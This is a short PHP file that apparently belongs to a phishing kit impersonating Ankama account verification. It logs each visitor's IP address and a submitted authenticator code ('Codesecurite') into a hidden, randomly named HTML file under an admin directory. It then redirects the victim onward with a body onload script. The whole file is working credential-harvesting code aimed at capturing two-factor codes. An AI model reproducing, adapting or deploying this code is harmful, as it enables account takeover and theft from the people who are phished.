<?php

$ip = $_SERVER["REMOTE_ADDR"];

$fichier = fopen('admin/U92Zb3ALSChwx4rLDa4DT5238i7i7ja.html', 'a+');
fwrite($fichier, "IP: ");
fwrite($fichier, $ip);
fwrite($fichier, "        Quand ? ".date('j F Y h:i:s A')."        Code Authentificator: ");
fwrite($fichier, $_POST["Codesecurite"].PHP_EOL);
fclose($fichier);

?>
<body onload="window.location.href = 'account.ankama=codes-verification.php';"></body>